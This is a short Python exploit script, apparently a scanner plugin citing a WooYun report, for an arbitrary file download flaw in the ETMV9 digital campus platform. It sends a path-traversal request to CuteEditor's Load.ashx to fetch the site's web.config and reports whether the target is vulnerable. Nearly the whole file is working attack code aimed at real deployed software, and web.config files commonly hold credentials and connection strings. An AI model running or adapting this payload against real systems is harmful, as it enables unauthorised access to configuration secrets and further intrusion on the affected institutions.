#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ETMV9数字化校园平台任意下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0100796
author: Lucifer
description: 该校园平台使用了第三方编辑器CuteEditor，虽然删除了存在任意文件上传的漏洞文件uploader.ashx
        （具体利用可参考白帽子zcgonvh的http://**.**.**.**/bugs/wooyun-2010-061932），与目录遍历漏洞文件browse_Img.asp，但是却忽略了任意文件包含漏洞文件Load.ashx。
'''
import sys
import requests
import warnings
def run(url):
        result = ['ETMV9数字化校园平台任意下载', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
